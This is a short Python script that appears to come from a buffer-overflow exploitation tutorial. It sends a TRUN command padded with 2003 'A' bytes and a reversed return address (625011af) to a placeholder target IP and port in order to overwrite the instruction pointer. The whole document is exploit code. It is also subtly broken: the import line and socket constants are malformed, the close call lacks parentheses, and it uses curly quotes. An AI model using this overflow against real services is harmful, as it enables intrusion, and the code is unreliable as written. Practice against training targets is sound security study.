#!/usr/bin/python
import sys. socket

#The code we are testing first in this example is ‘625011af’

shellcode = “A” * 2003 + “\xaf\x11\x50\x62”

#The “\xaf\x11\x50\x62” is our module number 625011af backwards split into two bits each time. This needs to be changed.

try:

    s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
    s.connect((‘{target ip}’ , ‘{target port}’ ))

    s.send((‘ TRUN /.:/ ‘ + shellcode))
    s.close

except:
    print “Error connecting to server”
    sys.exit()
